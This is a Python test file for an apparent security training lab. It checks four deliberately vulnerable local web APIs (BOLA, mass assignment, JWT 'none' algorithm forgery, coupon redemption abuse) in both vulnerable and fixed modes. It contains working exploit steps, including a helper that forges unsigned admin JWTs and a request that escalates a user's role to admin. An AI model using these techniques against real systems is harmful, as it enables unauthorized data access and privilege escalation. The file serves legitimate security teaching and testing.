"""Wave 3 golden tests: BOLA, mass assignment, JWT none, coupon abuse."""
import base64
import json
import os
import subprocess
import sys
import time
import urllib.request

REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
sys.path.insert(0, os.path.join(REPO, "packages", "lab-sdk"))
from flag import verify  # noqa: E402

SEED, SID = "golden-seed-1234", "s-golden"
PORTS = {"api-bola-01": 41221, "api-mass-01": 41222, "api-jwt-01": 41223, "api-ratelimit-01": 41224}

def req(port, path, method="GET", body=None, headers=None):
    r = urllib.request.Request(f"http://127.0.0.1:{port}{path}", method=method,
                               data=json.dumps(body).encode() if body is not None else None,
                               headers={"Content-Type": "application/json", **(headers or {})})
    try:
        with urllib.request.urlopen(r, timeout=5) as resp:
            return resp.status, dict(resp.headers), json.loads(resp.read() or b"{}")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), json.loads(e.read() or b"{}")

def start(slug, mode):
    port = PORTS[slug]
    env = dict(os.environ, SESSION_SEED=SEED, SESSION_ID=SID, LAB_MODE=mode,
               PORT=str(port), PYTHONPATH=os.path.join(REPO, "packages", "lab-sdk"))
    p = subprocess.Popen([sys.executable, os.path.join(REPO, "labs", "kingaweb-native", slug, "app.py")],
                         env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(50):
        try:
            if req(port, "/healthz")[0] == 200:
                return p
        except Exception:
            pass
        time.sleep(0.2)
    p.kill()
    raise RuntimeError(f"{slug} did not start")

def stop(p):
    p.terminate()
    try:
        p.wait(timeout=5)
    except Exception:
        p.kill()

def run(slug, mode, fn):
    p = start(slug, mode)
    try:
        fn(PORTS[slug])
    finally:
        stop(p)

def test_bola():
    def vuln(port):
        _, _, b = req(port, "/login", method="POST", body={"username": "alice"})
        assert b["invoices"] == ["INV-1"]
        s, _, b = req(port, "/api/v1/invoices/INV-2", headers={"Authorization": f"Bearer {b['token']}"})
        assert s == 200 and verify(b["flag"], SID, SEED, "bola-read") and "ssn" in b
    def fixed(port):
        _, _, b = req(port, "/login", method="POST", body={"username": "alice"})
        assert req(port, "/api/v1/invoices/INV-2", headers={"Authorization": f"Bearer {b['token']}"})[0] == 403
        s, _, b = req(port, "/api/v1/invoices/INV-1", headers={"Authorization": f"Bearer {b['token']}"})
        assert s == 200 and "flag" not in b
    run("api-bola-01", "vuln", vuln)
    run("api-bola-01", "fixed", fixed)

def test_mass():
    def vuln(port):
        _, _, b = req(port, "/login", method="POST", body={"username": "user", "password": "user"})
        tok = b["token"]
        s, _, _ = req(port, "/api/v1/profile", method="PATCH", body={"nickname": "x", "role": "admin"},
                       headers={"Authorization": f"Bearer {tok}"})
        assert s == 200
        s, _, b = req(port, "/admin/flag", headers={"Authorization": f"Bearer {tok}"})
        assert s == 200 and verify(b["flag"], SID, SEED, "mass-assign")
    def fixed(port):
        _, _, b = req(port, "/login", method="POST", body={"username": "user", "password": "user"})
        tok = b["token"]
        s, _, b = req(port, "/api/v1/profile", method="PATCH", body={"nickname": "x", "role": "admin"},
                       headers={"Authorization": f"Bearer {tok}"})
        assert s == 200 and b["role"] == "user"
        assert req(port, "/admin/flag", headers={"Authorization": f"Bearer {tok}"})[0] == 403
    run("api-mass-01", "vuln", vuln)
    run("api-mass-01", "fixed", fixed)

def _none(role):
    e = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip("=")
    return f"{e({'alg': 'none', 'typ': 'JWT'})}.{e({'sub': 'user', 'role': role})}."

def test_jwt():
    def vuln(port):
        s, _, b = req(port, "/admin/flag", headers={"Authorization": f"Bearer {_none('admin')}"})
        assert s == 200 and verify(b["flag"], SID, SEED, "jwt-none")
    def fixed(port):
        assert req(port, "/admin/flag", headers={"Authorization": f"Bearer {_none('admin')}"})[0] == 403
        _, _, b = req(port, "/login", method="POST", body={"username": "user", "password": "user"})
        assert req(port, "/admin/flag", headers={"Authorization": f"Bearer {b['token']}"})[0] == 403
    run("api-jwt-01", "vuln", vuln)
    run("api-jwt-01", "fixed", fixed)

def test_ratelimit():
    def vuln(port):
        _, _, b = req(port, "/login", method="POST", body={"username": "user", "password": "user"})
        tok = b["token"]
        got = None
        for _ in range(5):
            s, _, b = req(port, "/api/v1/coupons/redeem", method="POST", body={"code": "WELCOME10"},
                           headers={"Authorization": f"Bearer {tok}"})
            assert s == 200
            got = b
        assert verify(got["flag"], SID, SEED, "abuse-redeem") and got["balance"] == 50
    def fixed(port):
        _, _, b = req(port, "/login", method="POST", body={"username": "user", "password": "user"})
        tok = b["token"]
        codes = [req(port, "/api/v1/coupons/redeem", method="POST", body={"code": "WELCOME10"},
                     headers={"Authorization": f"Bearer {tok}"})[0] for _ in range(3)]
        assert codes == [200, 200, 429]
    run("api-ratelimit-01", "vuln", vuln)
    run("api-ratelimit-01", "fixed", fixed)
